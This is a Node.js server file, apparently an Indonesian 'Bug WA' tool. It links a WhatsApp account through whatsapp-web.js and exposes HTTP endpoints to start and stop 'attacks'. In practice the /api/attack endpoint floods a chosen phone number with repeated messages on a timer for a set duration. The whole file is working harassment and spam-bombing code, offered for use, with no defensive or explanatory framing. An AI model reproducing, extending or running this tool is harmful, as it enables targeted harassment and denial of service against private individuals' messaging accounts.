const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const { Client, LocalAuth } = require('whatsapp-web.js');
const fs = require('fs');

const app = express();
app.use(cors());
app.use(bodyParser.json());

let clients = {}; // { senderNumber: client }
let attackStatus = {}; // { target: { active, interval, count } }

// ========== PAIRING ==========
app.post('/api/pair', async (req, res) => {
    const { sender } = req.body;
    if (!sender) return res.json({ success: false, message: 'Nomor sender required' });
    
    if (clients[sender]) {
        return res.json({ success: true, message: 'Already paired', paired: true });
    }
    
    const client = new Client({
        authStrategy: new LocalAuth({ clientId: sender }),
        puppeteer: { headless: true, args: ['--no-sandbox'] }
    });
    
    client.on('qr', (qr) => {
        console.log(`QR for ${sender}:`, qr);
        // kirim QR via response? susah, kita pake pairing code lebih gampang
    });
    
    client.on('ready', () => {
        console.log(`Client ${sender} ready`);
        clients[sender] = client;
    });
    
    client.on('message', async (msg) => {
        console.log(`Message from ${msg.from}: ${msg.body}`);
    });
    
    try {
        await client.initialize();
        // request pairing code
        const code = await client.requestPairingCode(sender);
        res.json({ success: true, pairingCode: code, message: `Pairing code untuk ${sender}: ${code}` });
    } catch (err) {
        res.json({ success: false, message: err.message });
    }
});

// ========== CEK STATUS ==========
app.get('/api/status/:sender', (req, res) => {
    const { sender } = req.params;
    const isConnected = clients[sender] ? true : false;
    res.json({ connected: isConnected });
});

// ========== START ATTACK ==========
app.post('/api/attack', async (req, res) => {
    const { sender, target, method, duration, delay, message } = req.body;
    
    if (!clients[sender]) {
        return res.json({ success: false, message: 'Sender not paired' });
    }
    
    const client = clients[sender];
    const targetNumber = `${target}@c.us`;
    const spamMessage = message || `[${method.toUpperCase()}] BUG WA ATTACK!`;
    
    let count = 0;
    const interval = setInterval(() => {
        client.sendMessage(targetNumber, `${spamMessage} [${count++}]`).catch(e => console.log(e));
        console.log(`[${sender}] Spam ke ${target}: ${count}`);
    }, delay);
    
    attackStatus[`${sender}_${target}`] = { active: true, interval };
    
    setTimeout(() => {
        if (attackStatus[`${sender}_${target}`]?.active) {
            clearInterval(interval);
            attackStatus[`${sender}_${target}`].active = false;
            console.log(`Attack selesai untuk ${target}`);
        }
    }, duration * 1000);
    
    res.json({ success: true, message: `Attack started to ${target} for ${duration}s` });
});

// ========== STOP ATTACK ==========
app.post('/api/stop', (req, res) => {
    const { sender, target } = req.body;
    const key = `${sender}_${target}`;
    if (attackStatus[key] && attackStatus[key].active) {
        clearInterval(attackStatus[key].interval);
        attackStatus[key].active = false;
        res.json({ success: true, message: 'Attack stopped' });
    } else {
        res.json({ success: false, message: 'No active attack' });
    }
});

// ========== LOGOUT ==========
app.post('/api/logout', (req, res) => {
    const { sender } = req.body;
    if (clients[sender]) {
        clients[sender].destroy();
        delete clients[sender];
    }
    res.json({ success: true, message: 'Logged out' });
});

app.listen(3000, () => {
    console.log('Bug WA Server running on port 3000');
});